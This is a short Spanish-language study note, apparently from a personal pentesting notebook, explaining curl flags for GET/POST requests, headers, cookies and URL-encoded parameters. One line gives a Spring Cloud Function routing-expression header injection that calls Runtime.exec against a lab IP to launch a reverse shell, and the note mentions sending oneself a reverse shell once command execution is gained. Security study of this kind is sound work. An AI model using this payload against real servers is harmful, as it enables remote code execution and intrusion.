nos permite hace una peticion http a una direccion 
por ejemplo
`curl -s -X GET "http://10.10.11.204:8080/show_image?img=test.png" | jq`
- jq: es para mostrar en caso de que sea JSON y se vea mas bonito
`curl -s -X POST "http://ip/" -H 'cabezeras:contenido_cab' -d 'data=data'`
- para hacer envíos de datos por lo cual si hay ejecucion remota de comandos podemos mandarnos una revershell, no obstante es mejor primero crear un archivo con el script y luego ejectarlo 
`curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("Comando para la revershell")' -d '.'`
---
- -v: Vale para ver informacion del servido
- -H: mandar cabezeras ej: `-H 'cookie:adsfasdf'`
- -d: para mandar contenido "data" ej: `-d 'name=data'`
-  --cookie: permite agregar la cookie de sesion ej: `--cookie "asfdasdfa"`
- -X method: expecifica el metodo que va a usar "GET, POST,PUT" 
- `-G --data-urlencode "lo que quieras meter en la url y urlencodeado"` 
	-G en curl es utilizado para enviar una solicitud GET con parámetros en la cadena de consulta, mas info [[19. Abuso de subidas de archivos]] Ataque_56
	
	 
### Autenticarse
si la web tiene credenciales podemos hacerlo asi
![[Pasted image 20240524232612.png]]
